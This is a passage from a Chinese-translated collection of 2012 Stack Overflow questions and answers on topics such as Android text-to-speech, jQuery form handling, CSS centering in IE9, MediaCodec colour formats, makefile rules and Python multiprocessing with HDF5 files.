    myTTS.speak(speech, TextToSpeech.LANG_COUNTRY_AVAILABLE, null);
}

public void onInit(int status) {
    // TODO Auto-generated method stub
    if (status == TextToSpeech.SUCCESS) {
        if(myTTS.isLanguageAvailable(Locale.US)==TextToSpeech.LANG_AVAILABLE)
            myTTS.setLanguage(Locale.US);
    } else if (status == TextToSpeech.ERROR) {
        Toast.makeText(getApplicationContext(), "Sorry! Text To Speech failed...", Toast.LENGTH_LONG).show();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:18:47.207

这是一个示例 [链接](http://mobile.tutsplus.com/tutorials/android/android-sdk-using-the-text-to-speech-engine/)，您可能需要的部分粘贴在此处。

```
private TextToSpeech myTTS;

Intent checkTTSIntent = new Intent();
        checkTTSIntent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
        startActivityForResult(checkTTSIntent, MY_DATA_CHECK_CODE);
myTTS.speak(speech, TextToSpeech.QUEUE_FLUSH, null);

speakWords(words);  //call this function with the string you want as voice

        //speak the user text
private void speakWords(String speech) {
        //speak straight away
        myTTS.speak(speech, TextToSpeech.QUEUE_FLUSH, null);
}
    //act on result of TTS data check
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (requestCode == MY_DATA_CHECK_CODE) {
        if (resultCode == TextToSpeech.Engine.CHECK_VOICE_DATA_PASS) {
            //the user has the necessary data - create the TTS
        myTTS = new TextToSpeech(this, this);
        }
        else {
                //no data - install it now
            Intent installTTSIntent = new Intent();
            installTTSIntent.setAction(TextToSpeech.Engine.ACTION_INSTALL_TTS_DATA);
            startActivity(installTTSIntent);
        }
    }
}
    //setup TTS  and don't forget to implement OnInitListener interface to use this method
public void onInit(int initStatus) {
        //check for successful instantiation
    if (initStatus == TextToSpeech.SUCCESS) {
        if(myTTS.isLanguageAvailable(Locale.US)==TextToSpeech.LANG_AVAILABLE)
            myTTS.setLanguage(Locale.US);
    }
    else if (initStatus == TextToSpeech.ERROR) {
        Toast.makeText(this, "Sorry! Text To Speech failed...", Toast.LENGTH_LONG).show();
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:08:23.093

使用 android text to Speech api[在这里查看参考](http://developer.android.com/reference/android/speech/tts/TextToSpeech.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T13:46:10.913

在您的通知方法（`notificationManager.notify(0, notification);`调用位置）中，添加以下内容：

```
try {
        Uri ring_uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), ring_uri);
        r.play();
} catch (Exception e) {
        // Error playing sound
} 
```

每当您推送通知时，这都会发出通知声音。

# java - 使用 JNI 调用 C++ -> Java - 依赖项

> ID：13703555
> 
> 赞同：1
> 
> 时间：2012-12-04T13:01:13.767
> 
> 标签：java, c++, java-native-interface, dependencies

我尝试使用 JNI 从 c++ 调用 java 函数，我自己的 .jar 文件没有问题，但我的 java 部分有它自己的 .jar 依赖项。我试图将它添加到 c++ 中的 JavaVM 选项中：“-Djava.class.path=a.jar; b.jar”，其中 b.jar 是 a.jar 的依赖项，但不幸的是它不起作用。我总是有 NoSuchMethod 异常。JavaVM 选项中是否还有其他内容要添加？

# javascript - 提交时删除幻影文本默认值的简单方法

> ID：13703557
> 
> 赞同：0
> 
> 时间：2012-12-04T13:01:16.747
> 
> 标签：javascript, jquery

下面的脚本代码使幻影文本

```
$('.ghost-text').each(function(){
    var d = $(this).val();
    $(this).focus(function(){
        if ($(this).val() == d){
            $(this).val('').removeClass('ghost-text');
        }
    });
    $(this).blur(function(){
        if ($(this).val() == ''){
            $(this).val(d).addClass('ghost-text');
        }
    });
}); 
```

但是在提交时，它会传递默认的幽灵值。提交时如何删除？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:10:34.333

我相信最好使用占位符：

```
<input type="text" id="myTxt" placeholder="enter something..."/> 
```

或者，如果您想坚持使用您的 js：

```
 if($.browser.msie){
    $('.ghost-text').each(function(){
        var d = $(this).attr('placeholder');
        $(this).focus(function(){
            if ($(this).val() == d){
                $(this).val('').removeClass('ghost-text');
            }
        });
        $(this).blur(function(){
            if ($(this).val() == ''){
                $(this).val(d).addClass('ghost-text');
            }
        });
    });   

 $('form').submit(function(){
    $('.ghost-text').each(function(){
        if ($(this).val() == $(this).attr('placeholder'))
            $(this).val('');
    });
});
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:07:42.953

你有没有尝试过这样的事情？

```
$("#submit").click(function(){
    $(".ghost-text").each(function(){
        $(this).val('');
    }
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:07:49.720

```
var ghostTexts = $('.ghost-text');

    ghostTexts.each(function(){
        var $this = $(this),
            d = $(this).val();

        $this.on({
            'focus': function(){
                if ($this.val() == d){
                    $this.val('').removeClass('ghost-text');
                }
            },
            'blur': function() {
                if ($this.val() == ''){
                    $this.val(d).addClass('ghost-text');
                }
            }
        });
    });

    $('yourForm').on('submit', function() {
        ghostTexts.val('');
    }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:12:15.307

如果您调用“ghot text”水印并且能够使用 HTML5，请改用占位符属性：

```
<input type="text" placeholder="My ghost text" /> 
```

如果'ghost text'与水印无关并且不想提交它，你可以使用它来代替：

```
$('form').submit(function(){
    $('.ghost-text',this).each(function(){
        $(this).removeAttr('name');
    });
}); 
```

# objective-c - 在横向模式下如何更改图像的旋转

> ID：13703565
> 
> 赞同：0
> 
> 时间：2012-12-04T13:01:25.787
> 
> 标签：objective-c, ios, uiimage

我正在开发 PocketWallet 应用程序，我在其中获取任何类型的卡片背面和正面图像，然后将它们保存在数据库中。我的问题是，当我以纵向模式拍摄图像时，图像的旋转在我的结果视图中显示得很好。但是当我以横向模式拍摄图像时，图像会旋转 90 度。横向拍摄后如何在纵向模式下设置图像的旋转。我正在使用 UIimagePickerCamera 拍摄图像。请帮助我......在此先感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:22:50.527

如果你想知道你的图像是否是在横向模式下拍摄的，请查看`imageOrientation`UIImage 的属性。将`UIImagePickerCamera`正确设置该标志。听起来您的应用只需要对其进行更正。这篇[文章](https://stackoverflow.com/questions/1315251/how-to-rotate-a-uiimage-90-degrees)为您提供了如何做到这一点的方法。

# json - 如何访问json数据mule esb

> ID：13703573
> 
> 赞同：4
> 
> 时间：2012-12-04T13:01:38.423
> 
> 标签：json, esb, mule

我想将同步流生成的 json 数据访问到异步流中。我正确地从同步流中获取 json 数据，我想从中获取某些属性值，我的 json 数据如下：

```
{"data" : [{"in_timestamp":"2012-12-04","message":"hello","out_timestamp":null,"from_user":"user2","ID":43,"to_user":"user1"}]} and to user is #[json:to_user]} 
```

我想从此 json 格式访问 to_user 属性。我尝试过使用`#[json:to_user]`，但它只是将其打印为字符串并且不返回任何值。请帮忙。提前致谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-04T16:28:36.967

基于您的示例 JSON 的正确表达式是：

```
#[json:data[0]/to_user] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-21T04:16:22.307

JsonPath 表达式现在已被贬值，您甚至无法获得足够的文档来执行.. 因此
，目前您需要使用 :-`<json:json-to-object-transformer returnClass="java.lang.Object" doc:name="JSON to Object" />`
甚至根据 JSON 数据从 JSON 中提取数据`<json:json-to-object-transformer returnClass="java.util.HashMap" doc:name="JSON to Object" />`
`<json:json-to-object-transformer returnClass="java.util.List" doc:name="JSON to Object" />`

# css - 以下css样式是否有效

> ID：13703582
> 
> 赞同：2
> 
> 时间：2012-12-04T13:01:56.327
> 
> 标签：css

我正在阅读一本响应式网站书籍，其中我看到了样式定义，例如

```
.main-navigation 
  {
    li {position: relative;}
    .children 
          {
            left: -999em;
            position:absolute;
          }
   } 
```

我也尝试过在我的 css 文件中，但似乎没有工作。现在我的问题:) 我们可以用这种方式定义 css 样式吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:04:13.480

这不是正确的 CSS。但是您可以将其与 CSS 预处理器一起使用，例如[less](http://lesscss.org/#-nested-rules)。

引自网站：

> 在 Less 中，您可以简单地将选择器嵌套在其他选择器中，而不是构造长选择器名称来指定继承。这使得继承清晰并且样式表更短。

这也适用于[SASS/SCSS](http://sass-lang.com/)。

# asp.net - 如何在 C# 中使用他/她的 Facebook id 获取我朋友的 Facebook 好友列表？

> ID：13703588
> 
> 赞同：1
> 
> 时间：2012-12-04T13:02:12.433
> 
> 标签：asp.net, .net, facebook, c#-4.0

是否可以使用他的 Facebook id 获取我朋友的好友列表？我可以在网格中获取我自己的朋友列表，但现在我想根据他们的 Facebook 用户 ID 获取他们的朋友列表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T16:57:10.470

你不能。Facebook api 仅提供登录用户的好友列表信息。

如果您尝试它，您将收到如下消息：

```
 {
       "error": {
          "type": "Exception",
          "message": "(#604) Can't lookup all friends of <UID>. Can only lookup for the logged in user (<MY_UID>), or friends of the logged in user with the appropriate permission"
       }
    } 
```

如果你想这样做，你将不得不自己解析html和那些东西，但在facebook Graph Api之外

如果您在用户授权您的应用程序时需要适当的扩展权限，您可以访问当前登录用户的朋友的一些数据，但仅此而已。

（[http://developers.facebook.com/docs/authentication/permissions](http://developers.facebook.com/docs/authentication/permissions)见：friends_xxxx 权限），但不是他/她的朋友。

# makefile - 在 makefile 中创建具有多个先决条件的隐式规则

> ID：13703593
> 
> 赞同：1
> 
> 时间：2012-12-04T13:02:16.303
> 
> 标签：makefile

我有一个 makefile 有很多类似的外观声明：

```
ABC_01.exe: ABC_01.o ../constant.o
    gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll

ABC_02.exe: ABC_02.o ../constant.o
    gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll

ABC_03.exe: ABC_03.o ../constant.o
    gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll

ABC_04.exe: ABC_04.o ../constant.o
    gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll 
```

我想知道我是否可以创建一个隐式规则

```
%.exe:%.o ???
     gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll 
```

这样我就不必为每个可执行目标重复规则。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:06:12.963

没问题：

```
ABC_%.exe: ABC_%.o ../constant.o
    gcc $^ -o $@ $(SOMEPATH)/bin/constant.dll 
```

# css - IE9 CSS中心定位

> ID：13703594
> 
> 赞同：0
> 
> 时间：2012-12-04T13:02:18.557
> 
> 标签：css, internet-explorer-9, position, center

例如，请参考[jsfiddle](http://jsfiddle.net/AYv32/6/)。

我正在尝试呈现应出现在屏幕中央的弹出消息。

问题：IE9 在左侧呈现，IE8 在中间呈现正确，Chrome 和 Firefox 也很乐意在中间显示。

元素的 CSS 代码 (.cPUParent)：

```
.cPUParent {
  position: absolute;
  bottom: 20px;
  left: 5px;
  right: 0;
  width: auto;
  max-width: 187px;
  height: auto;
  padding: 5px 10px 0 15px;
  border: 2px solid #571C54;
  border-radius: 5px;
  margin-left: auto;
  margin-right: auto;
  background-color: rgb(109,49,107);
  -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";    /* opacity in IE 8 */
  filter: alpha(opacity=0);  /* opacity in IE 5-7 */
  opacity: 0;
  z-index: 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:55:56.973

将 .cPUParent 类中的 'max-width' 更改为 'width' 使其在 IE9 中工作：

[http://jsfiddle.net/rLwvP/](http://jsfiddle.net/rLwvP/)

```
.cPUParent {
  width: 187px;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:57:51.343

您必须考虑的是对象的高度和宽度。如果你可以设置一个固定的宽度，那么它很容易。这是适用于 ie8 和 9 的解决方案。

```
 .cPUParent {
        position: absolute;
        top: 50%;
        left: 50%;
        right: auto;
        bottom: auto;
        width: 100px;
        height: 100px;
        margin-left: -64.5px;
        margin-top: -54.5px;

        padding: 5px 10px 0 15px;
        border: 2px solid #571C54;
        border-radius: 5px;
        background-color: #6D316B;
        -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
        filter: alpha(opacity=0);
        opacity: 0;
        z-index: 999;
    } 
```

解释一下：如果您可以设置高度和宽度（本例中为 100px），那么您需要将其从屏幕边框的左侧和顶部的 50% 推入 50%。

```
 top: 50%;
        left: 50%; 
```

当您执行此操作时，它将框的左上角设置在该 50%/50% 点上，因此您需要将其向上拉一点（框的高度和宽度的一半）。（在解决这个问题时考虑盒子模型。填充和边框都添加到对象的宽度和高度）

```
 margin-left: -64.5px;
        margin-top: -54.5px; 
```

底部和右侧的值应重置为自动，以防有其他级联样式应用于它

```
 right: auto;
        bottom: auto; 
```

其余代码是您的原始样式：

```
 padding: 5px 10px 0 15px;
        border: 2px solid #571C54;
        border-radius: 5px;
        background-color: #6D316B;
        -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
        filter: alpha(opacity=0);
        opacity: 0;
        z-index: 999; 
```

不要忘记此时您将看不到任何东西，因为您将不透明度设置为 0（零）。

```
 -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
        filter: alpha(opacity=0);
        opacity: 0; 
```

那应该这样做。

# android - MediaCodec 和相机：色彩空间不匹配

> ID：13703596
> 
> 赞同：34
> 
> 时间：2012-12-04T13:02:22.427
> 
> 标签：android, colors, h.264, gstreamer, rtp

我一直在尝试使用新的低级[MediaCodec](http://developer.android.com/reference/android/media/MediaCodec.html)让 H264 编码与 Android 平板电脑上的相机捕获的输入一起工作。我在这方面遇到了一些困难，因为 MediaCodecAPI 的文档记录很差，但我终于得到了一些工作。

我将相机设置如下：

```
 Camera.Parameters parameters = mCamera.getParameters();
        parameters.setPreviewFormat(ImageFormat.YV12); // <1>
        parameters.setPreviewFpsRange(4000,60000);
        parameters.setPreviewSize(640, 480);            
        mCamera.setParameters(parameters); 
```

对于编码部分，我将 MediaCodec 对象实例化如下：

```
 mediaCodec = MediaCodec.createEncoderByType("video/avc");
    MediaFormat mediaFormat = MediaFormat.createVideoFormat("video/avc", 640, 480);
    mediaFormat.setInteger(MediaFormat.KEY_BIT_RATE, 500000);
    mediaFormat.setInteger(MediaFormat.KEY_FRAME_RATE, 15);
    mediaFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Planar); // <2>
    mediaFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5);
    mediaCodec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
    mediaCodec.start(); 
```

最终目标是创建一个 RTP 流（并与 Skype 对应），但到目前为止，我只是将原始 H264 直接流式传输到我的桌面。在那里，我使用以下 GStreamer 管道来显示结果：

```
gst-launch udpsrc port=5555 ! video/x-h264,width=640,height=480,framerate=15/1 ! ffdec_h264 ! autovideosink 
```

一切都很好，除了颜色。我需要在计算机中设置 2 种颜色格式：一种用于相机预览（用 标记的行`<1>`），另一种用于 MediaCodec 对象（用 标记`<2>`）

`<1>`确定我使用的行的可接受值`parameters.getSupportedPreviewFormats()`。由此，我知道相机上唯一支持的格式是[ImageFormat.NV21](http://developer.android.com/reference/android/graphics/ImageFormat.html#NV21)和[ImageFormat.YV2](http://developer.android.com/reference/android/graphics/ImageFormat.html#YV12)。

对于`<2>`，我检索了类型*video/avc的*[MediaCodecInfo.CodecCapabilities](http://developer.android.com/reference/android/media/MediaCodecInfo.CodecCapabilities.html) -object ，它是整数值 19（对应于[MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Planar和 2130708361（与](http://developer.android.com/reference/android/media/MediaCodecInfo.CodecCapabilities.html#COLOR_FormatYUV420Planar)[MediaCodecInfo.CodecCapabilities](http://developer.android.com/reference/android/media/MediaCodecInfo.CodecCapabilities.html)的任何值都不对应）。

 *上述以外的任何其他值都会导致崩溃。

结合这些设置会产生不同的结果，我将在下面展示。这是 Android 上的屏幕截图（即“真实”颜色）： ![在 Android 平板电脑上输入](../Images/2181006d5be22876cc8f204ea6a8065c.png) 以下是 Gstreamer 显示的结果：

`<1>`= NV21, `<2>`= COLOR_FormatYUV420Planar ![NV21-COLOR_FormatYUV420Planar 的 Gstreamer 输出](../Images/30fb5dc225c82a5febd60182746b6618.png)

`<1>`= NV21, `<2>`= 2130708361 ![NV21-2130708361 的 Gstreamer 输出](../Images/b6699c9caab93517853d197a5fc3d278.png)

`<1>`= YV2, `<2>`= COLOR_FormatYUV420Planar ![YV2-COLOR_FormatYUV420Planar 的 Gstreamer 输出](../Images/79f70e553940717b578638c867352da6.png)

`<1>`= YV2, `<2>`= 2130708361 ![YV2-2130708361 的 Gstreamer 输出](../Images/813dfd66019f1c7f05279c2905fbed0f.png)

可以看出，这些都不令人满意。YV2 色彩空间看起来最有希望，但看起来红色 (Cr) 和蓝色 (Cb) 是颠倒的。我猜 NV21 看起来是交错的（但是，我不是这个领域的专家）。

由于目的是与 Skype 通信，我认为我不应该更改解码器（即 Gstreamer 命令），对吧？这是否要在 Android 中解决？如果是这样：如何解决？或者这可以通过添加某些 RTP 有效负载信息来解决吗？还有什么建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-10T10:38:12.387

我通过使用一个简单的函数在 Android 级别自己交换字节平面来解决它：

```
public byte[] swapYV12toI420(byte[] yv12bytes, int width, int height) {
    byte[] i420bytes = new byte[yv12bytes.length];
    for (int i = 0; i < width*height; i++)
        i420bytes[i] = yv12bytes[i];
    for (int i = width*height; i < width*height + (width/2*height/2); i++)
        i420bytes[i] = yv12bytes[i + (width/2*height/2)];
    for (int i = width*height + (width/2*height/2); i < width*height + 2*(width/2*height/2); i++)
        i420bytes[i] = yv12bytes[i - (width/2*height/2)];
    return i420bytes;
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-07-10T05:29:52.763

我认为交换适当的值更有效。

```
 int wh4 = input.length/6; //wh4 = width*height/4
        byte tmp;
        for (int i=wh4*4; i<wh4*5; i++)
            {
            tmp = input[i];
            input[i] = input[i+wh4];
            input[i+wh4] = tmp;
            } 
```

也许更好，你可以代替

```
 inputBuffer.put(input); 
```

以正确的顺序排列 3 个平面切片

```
 inputBuffer.put(input, 0, wh4*4);
            inputBuffer.put(input, wh4*5, wh4);
            inputBuffer.put(input, wh4*4, wh4); 
```

我认为这应该只有很小的开销

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-05T16:54:49.017

看来Android是在YV12中传输的，但是H264标头中设置的格式是YUV420。这些格式是相同的，只是 U 和 V 通道的顺序不同，这解释了红色和蓝色的交换。

最好的当然是修复 Android 端的设置。但是如果没有办法为相机和编码器设置兼容的设置，你将不得不在 GStreamer 端强制格式。

这可以通过`capssetter`在`ffdec_h264`

`... ! ffdec_h264 ! capssetter caps="video/x-raw-yuv, format=(fourcc)YV12" ! colorspace ! ...`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T12:34:51.313

在相机上设置 ImageFormat.NV21 并为编码器设置 COLOR_FormatYUV420Planar 后，在我的情况下可以看到类似的蓝色阴影重叠。据我了解，在我的情况下不能使用上述交换功能，对可用于此的算法有什么建议吗？ps：当相机预览格式设置为YV12时，解码器完全黑屏

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-04-01T09:58:56.547

我使用[这里](https://stackoverflow.com/questions/17983502/how-can-i-convert-android-bitmap-to-nv12-color-format/66902368)的代码使用媒体编码器将相机图像转换为视频，这导致了同样的问题。

所以参考这篇[维基百科文章](https://en.wikipedia.org/wiki/YUV#Y%E2%80%B2UV420p_(and_Y%E2%80%B2V12_or_YV12)_to_RGB888_conversion)我修改了[这样](https://stackoverflow.com/a/66902368/3192693)的代码，输出似乎工作正常。而不是 uvuv 字节顺序，将字节顺序更改为 uuuuuvvvv ..*

# php - jQuery下拉菜单不出现

> ID：13703597
> 
> 赞同：2
> 
> 时间：2012-12-04T13:02:29.097
> 
> 标签：php, javascript, jquery, html

我正在尝试使用 jQuery/JavaScript 制作下拉菜单，但我的菜单不会显示任何内容。

这是我的代码：

JavaScript：

```
function toggleMenu(target){
    if($(target).css("display")=='none'){
        $("#drop_down, drop_menu").hide(500);
    $(target).toggle(500);
} 
```

头文件.php

```
<?php

?>
<div id="header" class="absolute" >
    <ul>
        <li class="float_left"><p class="pointer" onclick="toggleMenu('#drop_search')">Search</p></li>
        <li class="float_left"><p class="pointer" onclick="toggleMenu('#drop_login')">Log in</p></li>
        <li class="float_left"><p class="pointer" onclick="toggleMenu('#drop_chart')">My Cart</p></li>
        <li class="float_left"><p class="pointer" onclick="toggleMenu('#drop_menu')">Menu</p></li>
    </ul>
     <div class="clear_both"></div>
     <br/>    
    <div id="drop_down"class="right">
        <div id="drop_search" class="hidden">
            <p>Search</p>
        </div>
        <div id="drop_login" class="hidden">
            <p>login</p>
        </div>
        <div id="drop_chart" class="hidden">
            <p>cart</p>
        </div>
        <div id="drop_menu" class="hidden">
            <p>menu</p>
        </div>
    </div>
</div> 
```

抱歉，css很长，我只是想把它打包成一个文件

样式.css

```
body{
    position: relative;
    width: 100%;
    height: 100%;
    margin: 0px;
    padding: 0px;
    font-family: sans-serif;
}
body table{
    border-collapse: collapse;
    width: 100%;
}
body th, body tr, body td{
    padding: 0;
}
body h1, body h2,body h3,body h4,body h5,body h6,body p{
    margin: 0px;

}
body p{
    font-size: 12px;
}
body h6{
    font-size: 14px;
}body h5{
    font-size: 16px;
}body h4{
    font-size: 18px;
}body h3{
    font-size: 20px;
}body h2{
    font-size: 24px;
}body h1{
    font-size: 28px;
}
body ul,body li{
    list-style: none;
    margin: 0px;
    padding: 0px;
}
body img{
    border: none;
}
body hr{
    margin: 0px;
    border: none;
    height: 1px;
}
body a:link{
    text-decoration: none;
}
body a:visited{}
body a:hover{}
body .relative{
    position: relative;
}
body .absolute{
    position: absolute;
}
body .fixed{
    position: fixed;
}
body .float_left{
    float: left;
}
body .float_right{
    float: right;
}
body .clear_both{
    clear: both;
}
body input, body select, body textarea{
    border-radius: 5px;
}
body .input_text{}
body .input_select{
    border-radius: 5px;
    font-size: 11px;
}
body .input_option{
    background-color: #f6f6f6;
    color: #333333;
}
body .input_option_inactive{
    background-color: #f6f6f6;
    color: #888888;
}
body .input_submit{
    background: url("../images/submit.png");
    border: none;
    font-weight: bold;
    color: #efefef;
    cursor: pointer;
    border-radius: 20px;
    height: 20px;
}
body .input_submit:hover{
    color: #ffffff;
    text-shadow: 0 0 3px #efefef;
}
body .input_submit_inactive{
    background: url('#');
    border:none;
}
body .input_submit_inactive:hover{
    color: #333333;
    text-shadow: 0 0 3px #434343;
}
body .input_textarea{}
body .top{
    vertical-align: top;
}
body .middle{
    vertical-align: middle;
}
body .bottom{
    vertical-align: bottom;
}
body .left{
    text-align: left;
}
body .center{
    text-align: center;
}
body .right{
    text-align: right;
}
body .spacer{
    width: 10px;
    height: 10px;
}
body .bold{
    font-weight: bold;
}
body .italic{
    font-style: italic;
}
body .strip{
    text-decoration: line-through;
}
body .hidden{
    display: none;
}
body .show{
    display: block;
}
body .pointer{
    cursor: pointer;
}
body .scroll-y{
    overflow-y: scroll;
}
#whole{
    width: inherit;
    height:100%; 
    margin-left: auto;
    margin-right: auto;
    vertical-align: top;
}
.black{color: #000000;}
.white{color: #ffffff;}
.red{color: #ff0000;}
.green{color: #00ff00;}
.blue{color: #0000ff;}
.yellow{color: #ffff00;}
.toska{color: #00ffff;}
.pink{color: #ff00ff;} 
```

header.css

```
#header{
    right: 0;
    top: 0;
}
 #header li{ height: 20px;
    background: #960000;
}
#header li p{
    margin: 0 15px;
    color: #cccccc;
    height: 12px;    
    line-height: 20px;
    font-weight: bold;
}
#header li p:hover{
    color: #f6f6f6;
}
#header #drop_down{
    background: url('../images/black20.jpg');
} 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:18:05.870

删除您的`class="hidden"`并将默认设置为`style="display: none"`（或在页面加载时隐藏）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T09:36:41.507

此代码可能会根据您的要求工作。我没有更改您的代码，只是完全删除了 class="hidden" 。

**注意：**你没有提到你的 CSS，所以我假设你定义的类名。

如果我落后于某个地方，请告诉我......

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js" type="text/javascript"></script>
<style type="text/css">
#header {
    border:1px solid red;
    width:100%;
}
.pointer {
    cursor:pointer;
}
.absolute {
    position:absolute;
}
.float_left {
    float:left;
}
.right {
    float:right;
}
.clear_both {
    clear:both;
}
</style>
</head>
<body>
<div id="header" class="absolute">
  <ul>
    <li class="float_left">
      <p class="pointer" onclick="toggleMenu('#drop_search');">Search</p>
    </li>
    <li class="float_left">
      <p class="pointer" onclick="toggleMenu('#drop_login')">Log in</p>
    </li>
    <li class="float_left">
      <p class="pointer" onclick="toggleMenu('#drop_chart')">My Cart</p>
    </li>
    <li class="float_left">
      <p class="pointer" onclick="toggleMenu('#drop_menu')">Menu</p>
    </li>
  </ul>
  <div class="clear_both"></div>
  <br/>
  <div id="drop_down" class="right">
    <div id="drop_search">
      <p>Search</p>
    </div>
    <div id="drop_login">
      <p>login</p>
    </div>
    <div id="drop_chart">
      <p>cart</p>
    </div>
    <div id="drop_menu">
      <p>menu</p>
    </div>
  </div>
</div>
<script type="text/javascript">

$("#drop_down div").hide();
function toggleMenu(target)
{
    if($(target).css("display") != 'none')
    {
        $(target).hide(500);
    }
    else
    {
        $("#drop_down div").hide(500);
        $(target).show(500);
    }
}
</script>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T22:28:05.650

您的函数中有一个 sintaxe 错误
尝试使用此函数

> ```
> function toggleMenu(target){
>     if($(target).is(":hidden")){
>         $("#drop_down div").hide(500);
>     }
>     $(target).toggle(500);
> } 
> ```

并给我一些反馈...

# python - 使用多处理在 Python 中读取多个 HDF5 文件

> ID：13703602
> 
> 赞同：3
> 
> 时间：2012-12-04T13:02:43.340
> 
> 标签：python, multiprocessing, hdf5, pytables

`PyTables`我正在尝试使用and读取一堆 HDF5 文件（“一堆”表示 N > 1000 个文件）`multiprocessing`。基本上，我创建了一个类来读取我的数据并将其存储在 RAM 中；它在顺序模式下工作得非常好，我想并行化它以获得一些性能。

我现在尝试了一种虚拟方法，`flatten()`为我的类创建一个新方法来并行文件读取。以下示例是我正在尝试做的简化示例。`listf`是包含要读取的文件名称的字符串列表，`nx`并且`ny`是我要在文件中读取的数组的大小：

```
import numpy as np
import multiprocessing as mp
import tables

class data:
    def __init__(self, listf, nx, ny, nproc=0):
        self.listinc = []
        for i in range(len(listf)):
             self.listinc.append((listf[i], nx, ny))

    def __del__(self):
        del self.listinc

    def get_dsets(self, tuple_inc):
        listf, nx, ny = tuple_inc
        x = np.zeros((nx, ny))
        f = tables.openFile(listf)
        x = np.transpose(f.root.x[:ny,:nx])
        f.close()
        return(x)

    def flatten(self):
        nproc = mp.cpu_count()*2

        def worker(tasks, results):
            for i, x in iter(tasks.get, 'STOP'):
                print i, x
                results.put(i, self.get_dsets(x))

        tasks   = mp.Queue()
        results = mp.Queue()
        manager = mp.Manager()
        lx      = manager.list()

        for i, out in enumerate(self.listinc):
            tasks.put((i, out))

        for i in range(nproc):
            mp.Process(target=worker, args=(tasks, results)).start()

        for i in range(len(self.listinc)):
            j, res = results.get()
            lx.append(res)

        for i in range(nproc):
            tasks.put('STOP') 
```

我尝试了不同的方法（包括，就像我在这个简单示例中所做的那样，使用 a`manager`来检索数据），但我总是得到一个`TypeError: an integer is required`.

我不使用 ctypes 数组，因为我真的不需要共享数组（我只想检索我的数据），并且在检索数据后，我想用 NumPy 来玩它。

任何想法、提示或帮助将不胜感激！

**编辑：**我得到的完整错误如下：

```
Process Process-341:
Traceback (most recent call last):
  File "/usr/lib/python2.7/multiprocessing/process.py", line 258, in _bootstrap
    self.run()
  File "/usr/lib/python2.7/multiprocessing/process.py", line 114, in run
    self._target(*self._args, **self._kwargs)
  File "/home/toto/test/rd_para.py", line 81, in worker
    results.put(i, self.get_dsets(x))
  File "/usr/lib/python2.7/multiprocessing/queues.py", line 101, in put
    if not self._sem.acquire(block, timeout):
TypeError: an integer is required 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T16:35:17.013

答案其实很简单……

在`worker`, 因为它是我检索的元组，所以我不能这样做：

```
result.put(i, self.get_dsets(x)) 
```

但我必须这样做：

```
result.put((i, self.get_dsets(x))) 
```

然后效果很好。

# jquery - 在 div 中显示从服务器接收到的 XML 错误

> ID：13703603
> 
> 赞同：2
> 
> 时间：2012-12-04T13:02:43.660
> 
> 标签：jquery, ajax, web-services, client, client-server

我有一个接收 XML 响应的 Web 服务。在 jQuery 中，我有以下内容，用于获取某本书：

```
function getBookByIsbn() {

if($("#getAndDeleteIsbn").val() == '')
{
    alert("Please provide the ISBN");
    return false;
}
$.ajax({
    dataType: 'xml',
    type: 'GET',
    url: 'http://localhost:8080/library/books/' + $("#getAndDeleteIsbn").val(),
    success: function (data) {
        var string;
        if (window.ActiveXObject){
            string = data.xml;
        }
        else
        {
            string = (new XMLSerializer()).serializeToString(data);
        }
